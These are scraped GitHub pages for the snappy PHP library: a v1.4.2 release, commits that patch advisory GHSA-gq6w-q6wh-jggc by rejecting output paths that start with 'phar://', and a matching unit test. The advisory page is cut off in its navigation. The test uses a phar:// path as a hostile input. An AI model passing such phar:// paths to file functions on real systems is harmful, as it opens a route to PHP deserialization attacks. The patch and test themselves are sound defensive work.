=== Content from github.com_98bf2a4e_20250114_194153.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Freleases%2Ftag%2Fv1.4.2)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Freleases%2Ftag%2Fv1.4.2)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=KnpLabs%2Fsnappy)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[KnpLabs](/KnpLabs)
/
**[snappy](/KnpLabs/snappy)**
Public

* [Notifications](/login?return_to=%2FKnpLabs%2Fsnappy) You must be signed in to change notification settings
* [Fork
  438](/login?return_to=%2FKnpLabs%2Fsnappy)
* [Star
   4.4k](/login?return_to=%2FKnpLabs%2Fsnappy)

* [Code](/KnpLabs/snappy/tree/v1.4.2)
* [Issues
  5](/KnpLabs/snappy/issues)
* [Pull requests
  7](/KnpLabs/snappy/pulls)
* [Discussions](/KnpLabs/snappy/discussions)
* [Actions](/KnpLabs/snappy/actions)
* [Projects
  0](/KnpLabs/snappy/projects)
* [Security](/KnpLabs/snappy/security)
* [Insights](/KnpLabs/snappy/pulse)

Additional navigation options

* [Code](/KnpLabs/snappy/tree/v1.4.2)
* [Issues](/KnpLabs/snappy/issues)
* [Pull requests](/KnpLabs/snappy/pulls)
* [Discussions](/KnpLabs/snappy/discussions)
* [Actions](/KnpLabs/snappy/actions)
* [Projects](/KnpLabs/snappy/projects)
* [Security](/KnpLabs/snappy/security)
* [Insights](/KnpLabs/snappy/pulse)

1. [Releases](/KnpLabs/snappy/releases)
2. [v1.4.2](/KnpLabs/snappy/releases/tag/v1.4.2)

# v1.4.2

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/KnpLabs/snappy/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v1.4.2)

 Loading

[View all tags](/KnpLabs/snappy/tags)

![@AntoineLelaisant](https://avatars.githubusercontent.com/u/4592355?s=40&v=4)
[AntoineLelaisant](/AntoineLelaisant)
released this
17 Mar 14:48

·
[22 commits](/KnpLabs/snappy/compare/v1.4.2...master)
to master
since this release

[v1.4.2](/KnpLabs/snappy/tree/v1.4.2)

[`b66f793`](/KnpLabs/snappy/commit/b66f79334421c26d9c244427963fa2d92980b5d3)

This commit was created on GitHub.com and signed with GitHub’s **verified signature**.
The key has expired.

GPG key ID: 4AEE18F83AFDEB23
Expired

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

## What's Changed

* fix: security issue [GHSA-gq6w-q6wh-jggc](https://github.com/advisories/GHSA-gq6w-q6wh-jggc "GHSA-gq6w-q6wh-jggc") by [@AntoineLelaisant](https://github.com/AntoineLelaisant) in [#469](https://github.com/KnpLabs/snappy/pull/469)

## New Contributors

* [@AntoineLelaisant](https://github.com/AntoineLelaisant) made their first contribution in [#469](https://github.com/KnpLabs/snappy/pull/469)

**Full Changelog**: [v1.4.1...v1.4.2](https://github.com/KnpLabs/snappy/compare/v1.4.1...v1.4.2)

### Contributors

* [![@AntoineLelaisant](https://avatars.githubusercontent.com/u/4592355?s=64&v=4)](https://github.com/AntoineLelaisant)

AntoineLelaisant

 Assets
2

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_54f72d85_20250114_194151.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Fcommit%2Fb66f79334421c26d9c244427963fa2d92980b5d3)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Fcommit%2Fb66f79334421c26d9c244427963fa2d92980b5d3)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=KnpLabs%2Fsnappy)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[KnpLabs](/KnpLabs)
/
**[snappy](/KnpLabs/snappy)**
Public

* [Notifications](/login?return_to=%2FKnpLabs%2Fsnappy) You must be signed in to change notification settings
* [Fork
  438](/login?return_to=%2FKnpLabs%2Fsnappy)
* [Star
   4.4k](/login?return_to=%2FKnpLabs%2Fsnappy)

* [Code](/KnpLabs/snappy)
* [Issues
  5](/KnpLabs/snappy/issues)
* [Pull requests
  7](/KnpLabs/snappy/pulls)
* [Discussions](/KnpLabs/snappy/discussions)
* [Actions](/KnpLabs/snappy/actions)
* [Projects
  0](/KnpLabs/snappy/projects)
* [Security](/KnpLabs/snappy/security)
* [Insights](/KnpLabs/snappy/pulse)

Additional navigation options

* [Code](/KnpLabs/snappy)
* [Issues](/KnpLabs/snappy/issues)
* [Pull requests](/KnpLabs/snappy/pulls)
* [Discussions](/KnpLabs/snappy/discussions)
* [Actions](/KnpLabs/snappy/actions)
* [Projects](/KnpLabs/snappy/projects)
* [Security](/KnpLabs/snappy/security)
* [Insights](/KnpLabs/snappy/pulse)

## Commit

[Permalink](/KnpLabs/snappy/commit/b66f79334421c26d9c244427963fa2d92980b5d3)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request [#469](https://github.com/KnpLabs/snappy/pull/469) from KnpLabs/fix/[GHSA-gq6w-q6wh-jggc](https://github.com/advisories/GHSA-gq6w-q6wh-jggc "GHSA-gq6w-q6wh-jggc")

[Browse files](/KnpLabs/snappy/tree/b66f79334421c26d9c244427963fa2d92980b5d3)
Browse the repository at this point in the history

```
fix: security issue [GHSA-gq6w-q6wh-jggc](https://github.com/advisories/GHSA-gq6w-q6wh-jggc "GHSA-gq6w-q6wh-jggc")
```

* Loading branch information

Antoine Lelaisant
authored
Mar 17, 2023

2 parents
[cef6d3f](/KnpLabs/snappy/commit/cef6d3fd349236312e822e99957a0fbbac3f2cba)
+
[1ee6360](/KnpLabs/snappy/commit/1ee6360cbdbea5d09705909a150df7963a88efd6)

commit b66f793

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**28 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* src/Knp/Snappy

  + src/Knp/Snappy/AbstractGenerator.php
    [AbstractGenerator.php](#diff-6adf7c4700e4c193f4deac0f1076ffb09628e544f1820392376ee45b0e0390ab)
* tests/Knp/Snappy

  + tests/Knp/Snappy/AbstractGeneratorTest.php
    [AbstractGeneratorTest.php](#diff-4cbd2821fc2b87ab5613a9911dc9e8e524c5ff4c10a3c022a51191816574f1a0)

## There are no files selected for viewing

4 changes: 4 additions & 0 deletions

4
[src/Knp/Snappy/AbstractGenerator.php](#diff-6adf7c4700e4c193f4deac0f1076ffb09628e544f1820392376ee45b0e0390ab "src/Knp/Snappy/AbstractGenerator.php")

Show comments

[View file](/KnpLabs/snappy/blob/b66f79334421c26d9c244427963fa2d92980b5d3/src/Knp/Snappy/AbstractGenerator.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -625,6 +625,10 @@ protected function executeCommand($command) |
|  |  | \*/ |
|  |  | protected function prepareOutput($filename, $overwrite) |
|  |  | { |
|  |  | if (\strpos($filename, 'phar://') === 0) { |
|  |  | throw new InvalidArgumentException('The output file cannot be a phar archive.'); |
|  |  | } |
|  |  |  |
|  |  | $directory = \dirname($filename); |
|  |  |  |
|  |  | if ($this->fileExists($filename)) { |
| Expand Down | |  |

24 changes: 24 additions & 0 deletions

24
[tests/Knp/Snappy/AbstractGeneratorTest.php](#diff-4cbd2821fc2b87ab5613a9911dc9e8e524c5ff4c10a3c022a51191816574f1a0 "tests/Knp/Snappy/AbstractGeneratorTest.php")

Show comments

[View file](/KnpLabs/snappy/blob/b66f79334421c26d9c244427963fa2d92980b5d3/tests/Knp/Snappy/AbstractGeneratorTest.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -938,6 +938,30 @@ protected function configure(): void |
|  |  | ); |
|  |  | } |
|  |  |  |
|  |  | public function testFailingGenerateWithOutputContainingPharPrefix(): void |
|  |  | { |
|  |  | $media = $this->getMockBuilder(AbstractGenerator::class) |
|  |  | ->setMethods([ |
|  |  | 'configure', |
|  |  | 'prepareOutput', |
|  |  | ]) |
|  |  | ->setConstructorArgs(['the\_binary', [], ['PATH' => '/usr/bin']]) |
|  |  | ->getMock() |
|  |  | ; |
|  |  |  |
|  |  | $media->setTimeout(2000); |
|  |  |  |
|  |  | $media |
|  |  | ->expects($this->once()) |
|  |  | ->method('prepareOutput') |
|  |  | ->with($this->equalTo('phar://the\_output\_file')) |
|  |  | ; |
|  |  |  |
|  |  | $this->expectException(InvalidArgumentException::class); |
|  |  |  |
|  |  | $media->generate('the\_input\_file', 'phar://the\_output\_file', ['foo' => 'bar']); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @return null|string |
|  |  | \*/ |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `b66f793`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Fcommit%2Fb66f79334421c26d9c244427963fa2d92980b5d3) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_cd26264f_20250114_194150.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Fcommit%2F1ee6360cbdbea5d09705909a150df7963a88efd6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Fcommit%2F1ee6360cbdbea5d09705909a150df7963a88efd6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=KnpLabs%2Fsnappy)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[KnpLabs](/KnpLabs)
/
**[snappy](/KnpLabs/snappy)**
Public

* [Notifications](/login?return_to=%2FKnpLabs%2Fsnappy) You must be signed in to change notification settings
* [Fork
  438](/login?return_to=%2FKnpLabs%2Fsnappy)
* [Star
   4.4k](/login?return_to=%2FKnpLabs%2Fsnappy)

* [Code](/KnpLabs/snappy)
* [Issues
  5](/KnpLabs/snappy/issues)
* [Pull requests
  7](/KnpLabs/snappy/pulls)
* [Discussions](/KnpLabs/snappy/discussions)
* [Actions](/KnpLabs/snappy/actions)
* [Projects
  0](/KnpLabs/snappy/projects)
* [Security](/KnpLabs/snappy/security)
* [Insights](/KnpLabs/snappy/pulse)

Additional navigation options

* [Code](/KnpLabs/snappy)
* [Issues](/KnpLabs/snappy/issues)
* [Pull requests](/KnpLabs/snappy/pulls)
* [Discussions](/KnpLabs/snappy/discussions)
* [Actions](/KnpLabs/snappy/actions)
* [Projects](/KnpLabs/snappy/projects)
* [Security](/KnpLabs/snappy/security)
* [Insights](/KnpLabs/snappy/pulse)

## Commit

[Permalink](/KnpLabs/snappy/commit/1ee6360cbdbea5d09705909a150df7963a88efd6)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix: security issue [GHSA-gq6w-q6wh-jggc](https://github.com/advisories/GHSA-gq6w-q6wh-jggc "GHSA-gq6w-q6wh-jggc")

[Browse files](/KnpLabs/snappy/tree/1ee6360cbdbea5d09705909a150df7963a88efd6)
Browse the repository at this point in the history

* Loading branch information

Antoine Lelaisant
committed
Mar 17, 2023

1 parent
[cef6d3f](/KnpLabs/snappy/commit/cef6d3fd349236312e822e99957a0fbbac3f2cba)

commit 1ee6360

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**28 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* src/Knp/Snappy

  + src/Knp/Snappy/AbstractGenerator.php
    [AbstractGenerator.php](#diff-6adf7c4700e4c193f4deac0f1076ffb09628e544f1820392376ee45b0e0390ab)
* tests/Knp/Snappy

  + tests/Knp/Snappy/AbstractGeneratorTest.php
    [AbstractGeneratorTest.php](#diff-4cbd2821fc2b87ab5613a9911dc9e8e524c5ff4c10a3c022a51191816574f1a0)

## There are no files selected for viewing

4 changes: 4 additions & 0 deletions

4
[src/Knp/Snappy/AbstractGenerator.php](#diff-6adf7c4700e4c193f4deac0f1076ffb09628e544f1820392376ee45b0e0390ab "src/Knp/Snappy/AbstractGenerator.php")

Show comments

[View file](/KnpLabs/snappy/blob/1ee6360cbdbea5d09705909a150df7963a88efd6/src/Knp/Snappy/AbstractGenerator.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -625,6 +625,10 @@ protected function executeCommand($command) |
|  |  | \*/ |
|  |  | protected function prepareOutput($filename, $overwrite) |
|  |  | { |
|  |  | if (\strpos($filename, 'phar://') === 0) { |
|  |  | throw new InvalidArgumentException('The output file cannot be a phar archive.'); |
|  |  | } |
|  |  |  |
|  |  | $directory = \dirname($filename); |
|  |  |  |
|  |  | if ($this->fileExists($filename)) { |
| Expand Down | |  |

24 changes: 24 additions & 0 deletions

24
[tests/Knp/Snappy/AbstractGeneratorTest.php](#diff-4cbd2821fc2b87ab5613a9911dc9e8e524c5ff4c10a3c022a51191816574f1a0 "tests/Knp/Snappy/AbstractGeneratorTest.php")

Show comments

[View file](/KnpLabs/snappy/blob/1ee6360cbdbea5d09705909a150df7963a88efd6/tests/Knp/Snappy/AbstractGeneratorTest.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -938,6 +938,30 @@ protected function configure(): void |
|  |  | ); |
|  |  | } |
|  |  |  |
|  |  | public function testFailingGenerateWithOutputContainingPharPrefix(): void |
|  |  | { |
|  |  | $media = $this->getMockBuilder(AbstractGenerator::class) |
|  |  | ->setMethods([ |
|  |  | 'configure', |
|  |  | 'prepareOutput', |
|  |  | ]) |
|  |  | ->setConstructorArgs(['the\_binary', [], ['PATH' => '/usr/bin']]) |
|  |  | ->getMock() |
|  |  | ; |
|  |  |  |
|  |  | $media->setTimeout(2000); |
|  |  |  |
|  |  | $media |
|  |  | ->expects($this->once()) |
|  |  | ->method('prepareOutput') |
|  |  | ->with($this->equalTo('phar://the\_output\_file')) |
|  |  | ; |
|  |  |  |
|  |  | $this->expectException(InvalidArgumentException::class); |
|  |  |  |
|  |  | $media->generate('the\_input\_file', 'phar://the\_output\_file', ['foo' => 'bar']); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @return null|string |
|  |  | \*/ |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `1ee6360`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Fcommit%2F1ee6360cbdbea5d09705909a150df7963a88efd6) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_8ccd9373_20250114_194153.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Fsecurity%2Fadvisories%2FGHSA-gq6w-q6wh-jggc)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Fsecurity%2Fadvisories%2FGHSA-gq6w-q6wh-jggc)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=KnpLabs%2Fsnappy)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[KnpLabs](/KnpLabs)
/
**[snappy](/KnpLabs/snappy)**
Public

* [Notifications](/login?return_to=%2FKnpLabs%2Fsnappy) You must be signed in to change notification settings
* [Fork
  438](/login?return_to=%2FKnpLabs%2Fsnappy)
* [Star
   4.4k](/login?return_to=%2FKnpLabs%2Fsnappy)

* [Code](/KnpLabs/snappy)
* [Issues
  5](/KnpLabs/snappy/issues)
* [Pull requests
